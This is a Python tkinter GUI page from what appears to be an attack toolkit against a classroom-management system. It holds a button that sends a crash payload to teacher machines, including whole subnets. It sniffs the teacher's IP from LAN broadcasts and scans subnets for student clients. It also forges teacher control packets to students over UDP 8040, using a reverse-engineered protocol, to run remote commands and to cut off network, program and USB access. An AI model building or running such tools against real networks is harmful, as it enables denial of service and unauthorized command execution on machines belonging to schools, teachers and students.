# src/gui/pages/page_advanced.py
# 高级页 —— 远程崩溃 + 学生端安装测试 + 教师端管控指令模拟（单台/全体）
#
# ★ 教师端管控指令模拟基于逆向定稿协议（docs/ARBITRATION_VERIFICATION_REPORT.md、
#   docs/NET_LIMIT_PAYLOAD_RESEARCH.md）：
#     16B 头 [cmdType][flag1][flag2][len] + 载荷（cmdType=500 时载荷 = "/*//" + CtrlCode JSON）
#   发送通道：UDP 单播 → 学生机:8040（遍历单播 = 原生教师端"全体"的实现）

import tkinter as tk
from tkinter import ttk, messagebox

from src.modules.remote_crasher import (
    crash, crash_targets, expand_cidr, parse_payload, DEFAULT_PORT,
    build_original_payload, RESULT_OK, RESULT_FAIL,
)
from src.modules.teacher_control import (
    send_control, send_multi, build_packet, hex_preview,
    parse_targets, discover_students, listen_teacher_ip,
    DEFAULT_PORT as TC_DEFAULT_PORT,
    CMD_CALL_SIGN, CMD_REMOTE_CMD, CMD_STU_SET, CMD_EXAM_FILE_END,
    CMD_STU_INFO, CMD_NET_LIMIT,
    build_ctrl_payload, remote_cmd_payload,
    CTRL_DISABLED_NET, CTRL_ENABLE_NET_KEYFILTER, CTRL_DISABLED_APP, CTRL_USB_ALL,
)
from src.utils.logger import info, warn, error, debug


# 命令类型 → 显示名、数值、默认载荷模板
CMD_OPTIONS = [
    ("11 学生呼号/点名", CMD_CALL_SIGN, "{}"),
    ("13 远程命令", CMD_REMOTE_CMD, '{"text":"notepad","second":0}'),
    ("28 学生参数配置(StuSet)", CMD_STU_SET, "{}"),
    ("79 考试文件结束", CMD_EXAM_FILE_END, '{"exam":0}'),
    ("111 学生信息登记", CMD_STU_INFO, '{"ip":"","mac":"","name":"","stunum":"","shownum":"","pcname":"","autosign":""}'),
    ("500 网络限制", CMD_NET_LIMIT, ""),
]
CMD_MAP = {label: val for label, val, _ in CMD_OPTIONS}


class PageAdvanced:

    def __init__(self, ui):
        self.ui = ui
        self._discovered = []
        self._busy = False

    # ─────────────────────────── UI 构建 ───────────────────────────

    def build(self):
        ui = self.ui
        frame = ttk.Frame(ui.notebook)

        # ---- 上部：控件（可滚动） ----
        _, ctrl_frame = ui.make_scrollable(frame)

        self._build_crash_section(ctrl_frame)
        self._build_install_section(ctrl_frame)
        self._build_teacher_control_section(ctrl_frame)

        # ---- 下部：输出区域（固定底部） ----
        output_frame = ttk.Frame(frame)
        output_frame.pack(fill=tk.X, side=tk.BOTTOM, padx=5, pady=2)
        self.result_text = ui.make_output_text(output_frame, height=6)

        return frame

    def _build_crash_section(self, ctrl_frame):
        ui = self.ui
        info_frame = ttk.LabelFrame(ctrl_frame, text="远程功能（崩溃载荷）", padding=5)
        info_frame.pack(fill=tk.X, pady=2)
        ttk.Label(info_frame, text="向目标 IP 发送崩溃载荷，触发教师端监控通道崩溃。\n"
                  "逆向确认：9003 未监听时自动重试；收到'被迫关闭连接'=崩溃已触发。",
                  foreground="gray", wraplength=520).pack(anchor=tk.W, padx=2)

        addr_frame = ttk.Frame(info_frame)
        addr_frame.pack(fill=tk.X, padx=2, pady=5)
        ttk.Label(addr_frame, text="目标 IP/网段:").pack(anchor=tk.W)
        ip_row = ttk.Frame(addr_frame)
        ip_row.pack(fill=tk.X, pady=2)
        self.ip_input = ttk.Entry(ip_row)
        self.ip_input.pack(side=tk.LEFT, fill=tk.X, expand=True)
        ui.bind_tooltip(self.ip_input, "FUNC_CRASH_IP")
        self.btn_auto_teacher = ttk.Button(ip_row, text="自动获取教师端IP",
                                           command=self._do_auto_teacher_ip)
        self.btn_auto_teacher.pack(side=tk.LEFT, padx=4)
        ui.bind_tooltip(self.btn_auto_teacher,
                        "监听局域网 7777 教师广播，自动把教师机 IP 填入目标框")

        # ── 自定义开关：默认不显示端口/载荷，直接用默认值发送 ──
        self.var_crash_custom = tk.BooleanVar(value=False)
        chk_custom = ttk.Checkbutton(
            info_frame, text="自定义端口 / 载荷（不勾选则用默认值发送）",
            variable=self.var_crash_custom, command=self._toggle_crash_custom)
        chk_custom.pack(anchor=tk.W, padx=2, pady=(4, 0))

        # 自定义参数区（默认隐藏；勾选后显示，已预填默认值可改）
        self.crash_custom_frame = ttk.Frame(info_frame)

        ttk.Label(self.crash_custom_frame, text="端口:").pack(anchor=tk.W, padx=2)
        self.port_input = ttk.Entry(self.crash_custom_frame)
        self.port_input.insert(0, str(DEFAULT_PORT))
        self.port_input.pack(fill=tk.X, padx=2, pady=2)
        ui.bind_tooltip(self.port_input, "FUNC_CRASH_PORT")

        ttk.Label(self.crash_custom_frame, text="载荷:（留空 = 使用原版动态载荷）").pack(anchor=tk.W, padx=2)
        self.payload_input = ttk.Entry(self.crash_custom_frame)
        # 预填一份原版载荷样例（hex），用户可在此基础上修改
        try:
            self.payload_input.insert(0, build_original_payload().decode("ascii"))
        except Exception:
            self.payload_input.insert(0, "")
        self.payload_input.pack(fill=tk.X, padx=2, pady=2)
        ui.bind_tooltip(self.payload_input, "FUNC_CRASH_PAYLOAD")

        btn_crash = ttk.Button(info_frame, text="发送崩溃指令",
                               command=self._do_crash)
        btn_crash.pack(fill=tk.X, padx=2, pady=5)
        ui.bind_tooltip(btn_crash, "FUNC_CRASH_SEND")
        self._crash_send_btn = btn_crash  # 供自定义区插在它前面用

    def _toggle_crash_custom(self):
        """勾选/取消自定义：显示或隐藏端口/载荷输入区。"""
        if self.var_crash_custom.get():
            self.crash_custom_frame.pack(
                fill=tk.X, padx=2, pady=2, before=self._crash_send_btn)
        else:
            self.crash_custom_frame.pack_forget()

    def _build_install_section(self, ctrl_frame):
        ui = self.ui
        install_frame = ttk.LabelFrame(ctrl_frame, text="学生端安装测试", padding=5)
        install_frame.pack(fill=tk.X, pady=2)
        ttk.Label(install_frame, text="在指定目录下注册 MMPC 服务、安装管控驱动、添加防火墙规则。",
                  foreground="gray").pack(anchor=tk.W, padx=2)

        ttk.Label(install_frame, text="学生端套件目录（含 MMPC.exe / DriverInstall.exe）:").pack(anchor=tk.W, padx=2)
        self.install_dir = ttk.Entry(install_frame)
        from src.core.settings import toolkit_cfg
        self.install_dir.insert(0, toolkit_cfg.oseasy_path)
        self.install_dir.pack(fill=tk.X, padx=2, pady=2)

        btn_install = ttk.Button(install_frame, text="生成并运行安装测试脚本",
                                 command=self._do_install_test)
        btn_install.pack(fill=tk.X, padx=2, pady=5)
        ui.bind_tooltip(btn_install, "FUNC_INSTALL_STUDENT_TEST")

        btn_uninstall = ttk.Button(install_frame, text="生成并运行卸载测试脚本",
                                   command=self._do_uninstall_test)
        btn_uninstall.pack(fill=tk.X, padx=2, pady=5)
        ui.bind_tooltip(btn_uninstall, "FUNC_UNINSTALL_STUDENT_TEST")

    def _build_teacher_control_section(self, ctrl_frame):
        ui = self.ui
        tc_frame = ttk.LabelFrame(ctrl_frame, text="教师端管控指令模拟（单台 / 全体）", padding=5)
        tc_frame.pack(fill=tk.X, pady=2)
        ttk.Label(tc_frame,
                  text="模拟教师端向学生端发送管控指令。协议：16B头[cmdType][flag][flag][len]+载荷，"
                       "UDP 单播 → 学生机:8040（遍历单播即原生'全体'实现）。",
                  foreground="gray", wraplength=520).pack(anchor=tk.W, padx=2)

        # ── 目标 ──
        tc_addr = ttk.Frame(tc_frame)
        tc_addr.pack(fill=tk.X, padx=2, pady=3)
        ttk.Label(tc_addr, text="目标 IP/网段:").pack(anchor=tk.W)
        self.tc_ip_input = ttk.Entry(tc_addr)
        self.tc_ip_input.pack(fill=tk.X, pady=2)
        ttk.Label(tc_addr, text="支持：单IP / CIDR(192.168.1.0/24) / 逗号分隔 / 末段范围(192.168.1.10-20)",
                  foreground="gray").pack(anchor=tk.W)

        row = ttk.Frame(tc_addr)
        row.pack(fill=tk.X, pady=2)
        ttk.Label(row, text="端口:").pack(side=tk.LEFT)
        self.tc_port_input = ttk.Entry(row, width=8)
        self.tc_port_input.insert(0, str(TC_DEFAULT_PORT))
        self.tc_port_input.pack(side=tk.LEFT, padx=4)
        btn_scan = ttk.Button(row, text="扫描网段发现学生端", command=self._do_discover)
        btn_scan.pack(side=tk.RIGHT)
        ui.bind_tooltip(btn_scan, "扫描 8040 端口，实验性发现在线学生端")

        # ── 命令类型与载荷 ──
        tc_cmd_frame = ttk.Frame(tc_frame)
        tc_cmd_frame.pack(fill=tk.X, padx=2, pady=3)
        ttk.Label(tc_cmd_frame, text="命令类型:").pack(side=tk.LEFT)
        self.tc_cmd_var = tk.StringVar(value=CMD_OPTIONS[-1][0])
        self.tc_cmd_combo = ttk.Combobox(
            tc_cmd_frame, textvariable=self.tc_cmd_var, state="readonly",
            values=[label for label, _, _ in CMD_OPTIONS], width=26,
        )
        self.tc_cmd_combo.pack(side=tk.LEFT, padx=4)
        self.tc_cmd_combo.bind("<<ComboboxSelected>>", self._on_cmd_changed)

        # CtrlCode 快捷勾选（仅 500 网络限制显示）
        self.ctrl_frame = ttk.LabelFrame(tc_frame, text="CtrlCode 位标志（cmdType=500）", padding=3)
        self.ctrl_frame.pack(fill=tk.X, padx=2, pady=3)
        self.var_net = tk.BooleanVar(value=True)
        self.var_filter = tk.BooleanVar(value=False)
        self.var_app = tk.BooleanVar(value=False)
        self.var_usb = tk.BooleanVar(value=False)
        self.var_prefix = tk.BooleanVar(value=True)
        cb_row1 = ttk.Frame(self.ctrl_frame)
        cb_row1.pack(fill=tk.X, anchor=tk.W)
        ttk.Checkbutton(cb_row1, text="禁用网络(0x01)", variable=self.var_net).pack(side=tk.LEFT, padx=4)
        ttk.Checkbutton(cb_row1, text="网络过滤(0x02)", variable=self.var_filter).pack(side=tk.LEFT, padx=4)
        ttk.Checkbutton(cb_row1, text="禁用程序(0x10)", variable=self.var_app).pack(side=tk.LEFT, padx=4)
        ttk.Checkbutton(cb_row1, text="禁用USB(0x100+0x1000+0x10000)", variable=self.var_usb).pack(side=tk.LEFT, padx=4)
        cb_row2 = ttk.Frame(self.ctrl_frame)
        cb_row2.pack(fill=tk.X, anchor=tk.W, pady=2)
        ttk.Checkbutton(cb_row2, text="带 /*// 载荷前缀", variable=self.var_prefix).pack(side=tk.LEFT, padx=4)
        ttk.Label(cb_row2, text="（逆向确认 cmdType=500 载荷带 /*// 前缀）",
                  foreground="gray").pack(side=tk.LEFT, padx=4)
        self.ctrl_value_label = ttk.Label(self.ctrl_frame, text="CtrlCode = 0x00", foreground="blue")
        self.ctrl_value_label.pack(anchor=tk.W, padx=6, pady=2)
        # 勾选变化时更新显示
        for v in (self.var_net, self.var_filter, self.var_app, self.var_usb):
            v.trace_add("write", lambda *_: self._update_ctrl_label())

        # 载荷编辑器（500 隐藏，其余类型显示 JSON 输入）
        self.payload_frame = ttk.Frame(tc_frame)
        self.payload_frame.pack(fill=tk.X, padx=2, pady=3)
        ttk.Label(self.payload_frame, text="载荷(JSON/文本):").pack(anchor=tk.W)
        self.tc_payload_input = ttk.Entry(self.payload_frame)
        self.tc_payload_input.pack(fill=tk.X, pady=2)

        # ── 操作按钮 ──
        btn_row = ttk.Frame(tc_frame)
        btn_row.pack(fill=tk.X, padx=2, pady=3)
        btn_tc_single = ttk.Button(btn_row, text="发送到单台",
                                   command=lambda: self._do_teacher_control(all_flag=False))
        btn_tc_single.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        btn_tc_all = ttk.Button(btn_row, text="发送到全体",
                                command=lambda: self._do_teacher_control(all_flag=True))
        btn_tc_all.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        ui.bind_tooltip(btn_tc_single, "FUNC_TEACHER_CONTROL_SEND")
        ui.bind_tooltip(btn_tc_all, "FUNC_TEACHER_CONTROL_SEND")

        self._on_cmd_changed()  # 初始化控件状态

    # ─────────────────────────── 交互逻辑 ───────────────────────────

    def _on_cmd_changed(self, _event=None):
        """命令类型切换时，显示/隐藏对应控件并设置默认载荷。"""
        label = self.tc_cmd_var.get()
        val = CMD_MAP.get(label)
        is_net_limit = (val == CMD_NET_LIMIT)

        # CtrlCode 位标志区只在 500 显示；载荷输入框只在非 500 显示
        if is_net_limit:
            self.ctrl_frame.pack(fill=tk.X, padx=2, pady=3)
            try:
                self.payload_frame.pack_forget()
            except Exception:
                pass
            self._update_ctrl_label()
        else:
            try:
                self.ctrl_frame.pack_forget()
            except Exception:
                pass
            self.payload_frame.pack(fill=tk.X, padx=2, pady=3)
            default_payload = ""
            for lbl, v, template in CMD_OPTIONS:
                if lbl == label:
                    default_payload = template
                    break
            self.tc_payload_input.delete(0, tk.END)
            self.tc_payload_input.insert(0, default_payload)

    def _update_ctrl_label(self):
        ctrl = 0
        if self.var_net.get():
            ctrl |= CTRL_DISABLED_NET
        if self.var_filter.get():
            ctrl |= CTRL_ENABLE_NET_KEYFILTER
        if self.var_app.get():
            ctrl |= CTRL_DISABLED_APP
        if self.var_usb.get():
            ctrl |= CTRL_USB_ALL
        try:
            self.ctrl_value_label.config(text=f"CtrlCode = 0x{ctrl:X} ({ctrl})")
        except Exception:
            pass
        return ctrl

    def _collect_payload(self) -> bytes:
        """根据当前命令类型+UI 状态构造载荷字节。"""
        label = self.tc_cmd_var.get()
        val = CMD_MAP.get(label)
        if val == CMD_NET_LIMIT:
            ctrl = self._update_ctrl_label()
            payload = build_ctrl_payload(ctrl, with_prefix=self.var_prefix.get())
            return payload
        text = self.tc_payload_input.get()
        if val == CMD_REMOTE_CMD:
            # 若用户填的是纯文本命令，包装为 {"text":...}；若是 JSON 则原样
            stripped = text.strip()
            if stripped.startswith("{"):
                return stripped.encode("utf-8")
            return remote_cmd_payload(stripped)
        return text.encode("utf-8")

    # ─────────────────────────── 动作 ───────────────────────────

    def _do_auto_teacher_ip(self):
        """监听局域网 7777 教师广播，自动把教师机 IP 填入崩溃目标框。

        教师端每 ~1s 广播一次 teacherip，所以监听几秒内通常能拿到。
        在后台线程运行（UDP 等待不阻塞 GUI），完成后调度回主线程填入 IP。
        """
        ui = self.ui
        # 防重复触发
        if getattr(self, "_auto_busy", False):
            ui.show_snakemessage("正在监听教师广播，请稍候…")
            return
        self._auto_busy = True
        self.btn_auto_teacher.config(state="disabled", text="监听中…")

        def _run():
            try:
                tip = listen_teacher_ip(timeout=8.0)
            except OSError as exc:
                tip = None
                err = str(exc)
                ui.root.after(0, lambda: self._auto_teacher_done(
                    None, f"无法监听 7777 端口：{err}\n（可能被学生端进程占用，需以管理员或改用 pktmon 确认）"))
                return
            ui.root.after(0, lambda: self._auto_teacher_done(tip))

        ui.clear_text(self.result_text)
        ui.append_text(self.result_text, "[自动获取] 正在监听局域网 7777 教师广播…", ui.root)
        ui._run_in_thread(_run, "自动获取教师端IP")

    def _auto_teacher_done(self, tip, msg=None):
        """主线程回调：把拿到的教师机 IP 填入目标框并恢复按钮。"""
        self._auto_busy = False
        self.btn_auto_teacher.config(state="normal", text="自动获取教师端IP")
        if msg:
            self.ui.append_text(self.result_text, msg, self.ui.root)
            self.ui.show_snakemessage("自动获取教师端IP失败")
            return
        if tip:
            self.ip_input.delete(0, tk.END)
            self.ip_input.insert(0, tip)
            self.ui.append_text(self.result_text, f"[自动获取] 已填入教师机 IP：{tip}", self.ui.root)
            self.ui.show_snakemessage(f"已填入教师机 IP：{tip}")
        else:
            self.ui.append_text(
                self.result_text,
                "[自动获取] 超时未捕获到教师广播（确认教师端在线且在同一网段）",
                self.ui.root,
            )
            self.ui.show_snakemessage("未获取到教师端IP（教师广播不可达）")

    def _do_crash(self):
        """发起崩溃指令发送（后台线程执行，完成后主线程弹窗）。

        交互逻辑：
          - 成功 → 弹 info 对话框，显示详细结果
          - 失败 → 弹 askyesno 对话框，显示错误详情，询问是否重试
        """
        ui = self.ui
        ip = self.ip_input.get().strip()
        if not ip:
            ui.show_snakemessage("请先填写目标 IP/网段")
            return
        # 默认用默认值发送；仅当勾选"自定义"时才读取端口/载荷输入框
        if self.var_crash_custom.get():
            try:
                port = int(self.port_input.get().strip() or DEFAULT_PORT)
            except ValueError:
                ui.show_snakemessage("端口必须是数字")
                return
            payload = parse_payload(self.payload_input.get())
        else:
            port = int(DEFAULT_PORT)
            payload = parse_payload("")  # 空 → 原版动态载荷

        def _run():
            if "/" in ip:
                hosts = expand_cidr(ip)
                result = crash_targets(hosts[:64], port, payload)
            else:
                result = crash(ip, port, payload)
            # 线程内不能直接弹窗（Tk 非线程安全），调度回主线程
            ui.root.after(0, lambda: self._crash_done(result, ip, port, payload))

        self.ui.clear_text(self.result_text)
        self.ui.append_text(self.result_text, f"正在向 {ip}:{port} 发送崩溃指令...", ui.root)
        ui._run_in_thread(_run, "远程崩溃")

    def _crash_done(self, result: str, ip: str, port: int, payload: bytes):
        """主线程回调：追加结果 + 按成功/失败弹对话框。"""
        self.ui.append_text(self.result_text, result, self.ui.root)
        detail = result.replace(RESULT_OK, "").replace(RESULT_FAIL, "").strip()
        is_ok = result.startswith(RESULT_OK)
        if is_ok:
            messagebox.showinfo(
                "崩溃指令已触发",
                f"目标: {ip}:{port}\n载荷: {payload!r}\n\n"
                f"✅ 发送成功\n\n{detail}",
            )
        else:
            retry = messagebox.askyesno(
                "崩溃指令发送失败",
                f"目标: {ip}:{port}\n载荷: {payload!r}\n\n"
                f"❌ 发送失败\n\n{detail}\n\n"
                f"是否重试？",
            )
            if retry:
                # 递归重跑（复用当前 GUI 输入）
                self._do_crash()

    def _do_install_test(self):
        """生成并运行学生端安装测试脚本"""
        ui = self.ui
        base = self.install_dir.get().strip()
        from src.core.settings import toolkit_cfg
        if not base:
            base = toolkit_cfg.oseasy_path
        import os
        if not os.path.isdir(base):
            ui.show_snakemessage(f"目录不存在: {base}")
            return

        from src.modules.script_generator import script_gen

        def _on_output(line):
            self.ui.append_text(self.result_text, line, ui.root)

        def _run():
            path = script_gen.run_install_student_test(on_output=_on_output)
            self.ui.append_text(self.result_text, f"安装测试脚本已运行: {path}", ui.root)

        self.ui.clear_text(self.result_text)
        self.ui.append_text(self.result_text, f"正在生成并运行安装测试脚本（目录: {base}）...", ui.root)
        ui._run_in_thread(_run, "学生端安装测试")

    def _do_uninstall_test(self):
        """生成并运行学生端卸载测试脚本"""
        ui = self.ui
        base = self.install_dir.get().strip()
        from src.core.settings import toolkit_cfg
        if not base:
            base = toolkit_cfg.oseasy_path
        import os
        if not os.path.isdir(base):
            ui.show_snakemessage(f"目录不存在: {base}")
            return

        from src.modules.script_generator import script_gen

        def _on_output(line):
            self.ui.append_text(self.result_text, line, ui.root)

        def _run():
            path = script_gen.run_uninstall_student_test(on_output=_on_output)
            self.ui.append_text(self.result_text, f"卸载测试脚本已运行: {path}", ui.root)

        self.ui.clear_text(self.result_text)
        self.ui.append_text(self.result_text, f"正在生成并运行卸载测试脚本（目录: {base}）...", ui.root)
        ui._run_in_thread(_run, "学生端卸载测试")

    def _do_discover(self):
        """扫描网段发现学生端（实验性）。"""
        ui = self.ui
        cidr = self.tc_ip_input.get().strip()
        if not cidr or "/" not in cidr:
            ui.show_snakemessage("网段发现需要 CIDR 格式（如 192.168.1.0/24）")
            return
        try:
            port = int(self.tc_port_input.get().strip() or TC_DEFAULT_PORT)
        except ValueError:
            ui.show_snakemessage("端口必须是数字")
            return

        def _run():
            self.ui.append_text(self.result_text, f"[发现] 正在扫描 {cidr}:{port}，请稍候...", ui.root)
            found = discover_students(cidr, port=port)
            self._discovered = found
            if found:
                self.ui.append_text(
                    self.result_text,
                    f"[发现] 疑似学生端 {len(found)} 台: {', '.join(found[:50])}",
                    ui.root,
                )
                cur = self.tc_ip_input.get().strip()
                if cur:
                    self.tc_ip_input.delete(0, tk.END)
                    self.tc_ip_input.insert(0, cur + "," + ",".join(found))
                else:
                    self.tc_ip_input.insert(0, ",".join(found))
            else:
                self.ui.append_text(self.result_text, "[发现] 未探测到应答（可能无应答协议或不在线）", ui.root)

        self.ui.clear_text(self.result_text)
        ui._run_in_thread(_run, "学生端发现")

    def _do_teacher_control(self, all_flag: bool = False):
        """模拟教师端向学生端发送管控指令。

        Args:
            all_flag: True=全体（遍历所有目标），False=单台（只发第一个 IP）。
        """
        ui = self.ui
        text = self.tc_ip_input.get().strip()
        if not text:
            ui.show_snakemessage("请先填写目标 IP/网段")
            return
        try:
            port = int(self.tc_port_input.get().strip() or TC_DEFAULT_PORT)
        except ValueError:
            ui.show_snakemessage("端口必须是数字")
            return

        cmd_label = self.tc_cmd_var.get()
        cmd_type = CMD_MAP.get(cmd_label)
        if cmd_type is None:
            ui.show_snakemessage("未知命令类型")
            return

        # 解析目标
        targets = parse_targets(text)
        if not targets:
            ui.show_snakemessage("无法解析目标")
            return
        if all_flag:
            targets = targets[:256]  # 防御：全体最多 256 台
        else:
            targets = targets[:1]    # 单台模式只发第一个

        payload = self._collect_payload()
        pkt = build_packet(cmd_type, payload)

        mode = "全体" if all_flag else "单台"
        mode_str = f"[{mode}] 目标: {', '.join(targets)} ({len(targets)}台)"

        def _run():
            self.ui.append_text(self.result_text, mode_str, ui.root)
            if len(targets) == 1:
                result = send_control(targets[0], cmd_type, payload, port)
            else:
                result = send_multi(targets, cmd_type, payload, port)
            self.ui.append_text(self.result_text, result, ui.root)
            self.ui.append_text(
                self.result_text,
                f"报文({len(pkt)}B) hex: {hex_preview(pkt)}",
                ui.root,
            )
            info(f"教师端指令 {mode} 完成: {cmd_label} -> {len(targets)} 台")

        self.ui.clear_text(self.result_text)
        self.ui.append_text(
            self.result_text,
            f"正在向 {targets[0] if targets else '?'}:{port} 发送 {cmd_label} ...",
            ui.root,
        )
        ui._run_in_thread(_run, "教师端管控指令")